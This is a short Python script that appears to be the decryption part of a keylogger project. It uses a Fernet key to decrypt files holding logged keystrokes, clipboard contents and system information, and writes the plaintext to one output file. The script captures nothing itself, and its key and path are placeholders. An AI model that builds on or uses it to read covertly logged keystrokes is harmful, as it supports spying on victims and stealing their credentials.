# Import necessary libraries
from cryptography.fernet import Fernet
import os

# Encryption key
key = "enter user encript key here which has generate by generatekey.py file"

# Encrypted file names
system_information_e = 'e_systeminfo.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_keys_log.txt'

# Output file settings
output_directory = "file path"
output_file_name = "decryption.txt"

# Change the working directory to the script's directory
script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

# Full path for the output file
output_file_path = os.path.join(output_directory, output_file_name)

# List of encrypted files
encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]

# Decrypt and write to the output file
with open(output_file_path, 'ab') as output_file:
    for encrypted_file in encrypted_files:
        file_path = os.path.join(script_dir, encrypted_file)

        try:
            with open(file_path, 'rb') as encrypted_file:
                data = encrypted_file.read()

            fernet = Fernet(key)
            decrypted = fernet.decrypt(data)

            output_file.write(decrypted)
        except FileNotFoundError:
            print(f"Error: File not found - {file_path}")
        except Exception as e:
            print(f"Error: An unexpected error occurred - {e}")

